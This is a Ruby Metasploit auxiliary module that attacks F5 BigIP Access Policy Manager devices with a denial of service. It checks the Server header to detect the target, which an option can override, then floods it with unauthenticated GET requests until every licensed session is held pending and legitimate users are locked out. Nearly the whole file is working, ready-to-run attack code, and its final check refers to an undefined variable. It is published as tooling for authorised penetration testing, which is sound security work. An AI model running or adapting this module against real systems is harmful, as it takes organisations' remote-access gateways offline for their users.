##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 BigIP Access Policy Manager Session Exhaustion Denial of Service',
      'Description'    => %q{
        This module exploits a resource exhaustion denial of service in F5 BigIP devices. An
        unauthenticated attacker can establish multiple connections with BigIP Access Policy
        Manager (APM) and exhaust all available sessions defined in customer license. In the
        first step of the BigIP APM negotiation the client sends a HTTP request. The BigIP
        system creates a session, marks it as pending and then redirects the client to an access
        policy URI. Since BigIP allocates a new session after the first unauthenticated request,
        and deletes the session only if an access policy timeout expires, the attacker can exhaust
        all available sessions by repeatedly sending the initial HTTP request and leaving the
        sessions as pending.
      },
      'Author'         =>
        [
          'Denis Kolegov <dnkolegov[at]gmail.com>',
          'Oleg Broslavsky <ovbroslavsky[at]gmail.com>',
          'Nikita Oleksov <neoleksov[at]gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'https://support.f5.com/kb/en-us/products/big-ip_apm/releasenotes/product/relnote-apm-11-6-0.html']
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 443
        }
    ))

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000]),
        OptBool.new('FORCE', [true, 'Proceed with attack even if a BigIP virtual server isn\'t detected', false])
      ])
  end

  def run
    limit = datastore['RLIMIT']
    force_attack = datastore['FORCE']

    res = send_request_cgi('method' => 'GET', 'uri' => '/')

    unless res
      print_error("No answer from the BigIP server")
      return
    end

    # Simple test based on HTTP Server header to detect BigIP virtual server
    server = res.headers['Server']
    unless server =~ /BIG\-IP/ || server =~ /BigIP/ || force_attack
      print_error("BigIP virtual server was not detected. Please check options")
      return
    end

    print_status("Starting DoS attack")

    # Start attack
    limit.times do |step|
      if step % 100 == 0
        print_status("#{step * 100 / limit}% accomplished...")
      end
      res = send_request_cgi('method' => 'GET', 'uri' => '/')
      if res && res.headers['Location'] =~ /\/my\.logout\.php3\?errorcode=14/
        print_good("DoS accomplished: The maximum number of concurrent user sessions has been reached.")
        return
      end
    end

    # Check if attack has failed
    res = send_request_cgi('method' => 'GET', 'uri' => uri)
    if res.headers['Location'] =~ /\/my.policy/
      print_error("DoS attack failed. Try to increase the RLIMIT")
    else
      print_status("Result is undefined. Try to manually determine DoS attack result")
    end

    rescue ::Errno::ECONNRESET
      print_error("The connection was reset. Maybe BigIP 'Max In Progress Sessions Per Client IP' counter was reached")
    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to BigIP")
    rescue ::Rex::ConnectionTimeout
      print_error("Unable to connect to BigIP. Please check options")
    rescue ::OpenSSL::SSL::SSLError
      print_error("SSL/TLS connection error")
  end
end
